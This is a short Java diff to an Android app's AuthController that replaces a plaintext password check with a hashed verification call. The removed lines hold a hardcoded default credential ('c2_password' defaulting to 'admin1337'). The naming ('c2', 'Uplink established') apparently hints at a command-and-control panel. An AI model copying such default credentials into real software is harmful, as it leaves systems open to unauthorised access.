@@ -44,9 +44,9 @@ public class AuthController {
             }
 
             boolean isJson = "true".equals(session.getParms().get("json"));
-            String storedPassword = getStoredPassword();
+            boolean isAuthenticated = PasswordHasher.verifyPassword(context, pass);
 
-            if (pass != null && storedPassword.equals(pass.trim())) {
+            if (isAuthenticated) {
                 FirebaseConfig.logActivity("AUTHENTICATION_SUCCESS: Uplink established");
 
                 Response response;
@@ -85,10 +85,5 @@ public class AuthController {
                 .edit().putString("session_token", newToken).apply();
 
         return server.serveGzippedProxy(session, "text/html", logoutHtml);
-    }
-
-    private String getStoredPassword() {
-        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getString("c2_password", "admin1337");
     }
 }
